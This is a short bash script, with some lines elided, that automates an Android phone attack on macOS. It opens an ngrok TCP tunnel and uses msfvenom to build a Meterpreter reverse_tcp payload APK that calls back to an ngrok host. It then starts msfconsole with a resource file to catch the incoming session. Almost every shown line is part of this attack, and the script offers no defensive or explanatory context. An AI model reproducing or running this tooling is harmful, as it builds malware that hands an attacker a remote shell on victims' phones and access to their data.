#!/bin/bash
osascript -e 'tell application "Terminal" to do script "cd '$(pwd)';./ngrok tcp 4569"'
clear
...
msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$rport R >$(pwd)/payload.apk
...
osascript -e 'tell application "Terminal" to do script "cd '$(pwd)';msfconsole -r auto.rc"' > /dev/null 2>&1
